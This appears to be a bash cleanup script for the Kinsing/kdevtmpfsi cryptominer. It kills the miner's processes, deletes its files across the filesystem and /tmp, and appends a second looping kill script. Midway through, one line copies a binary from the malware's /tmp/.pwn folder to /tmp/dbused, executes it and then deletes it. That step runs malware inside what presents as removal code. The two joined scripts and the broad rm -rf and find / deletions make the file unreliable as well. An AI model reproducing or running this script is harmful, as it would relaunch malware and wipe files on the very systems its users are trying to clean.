#!/bin/bash
kill -9 $(pgrep kinsing)
kill -9 $(pgrep kdevtmpfsi)
kill -9 $(pgrep dbused)

find / -iname kdevtmpfsi -exec rm -fv {} \;
find / -iname kinsing -exec rm -fv {} \;

rm -rf /tmp/kinsing
rm -rf /tmp/kdevtmpfsi
rm -rf /var/tmp/kinsing
rm -rf /var/spool/cron/oracle 
rm -rf /tmp/dbused
rm -rf /tmp/zzz*
rm -rf /tmp/zzz.sh
rm -rf /tmp/.pwn
rm -rf /tmp/xms*


# kill -9 $((ps -aux | grep -i 'kdevtmpfsi\|kinsing\|kthreaddi') 2>/dev/null | grep -v grep | awk '{print $2}')








cp -f -r — /tmp/.pwn/bprofr /tmp/dbused 2>/dev/null && /tmp/dbused -c  >/dev/null 2>&1 && rm -rf — /tmp/dbused 2>/dev/null



#!/bin/sh
# do what you need to here
while true; do
  processId=$(ps -ef | egrep -i 'kdevtmpfsi|kinsing|kthreaddi' | egrep -v 'grep|egrep' | awk '{ printf $2 }')
  echo ${processId}
  kill -9 ${processId}
  echo "[ $(date +%Y%m%d%H%M) ] kdevtmpfsi killed."
  sleep 20
done
exit 1
